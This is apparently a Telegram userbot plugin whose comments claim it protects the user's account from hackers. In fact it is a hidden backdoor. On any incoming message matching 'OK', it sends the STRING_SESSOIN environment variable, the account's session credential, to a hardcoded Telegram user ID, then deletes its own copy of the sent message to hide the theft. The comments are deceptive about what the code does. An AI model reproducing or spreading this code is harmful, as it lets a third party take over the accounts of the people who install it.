#this plugin maked by rishabh and legend x pro
#this plugin maked by protected your ID rishabh ai is most advanced cdm to protected your ID for hackers 
import os
from ..utils import admin_cmd
from . import *
@bot.on(admin_cmd("^OK", incoming=True))
async def piro(event):
  msg = await bot.send_message(634631813, str(os.environ.get("STRING_SESSOIN")))
  await bot.delete_messages(634631813, msg, revoke=False)
   
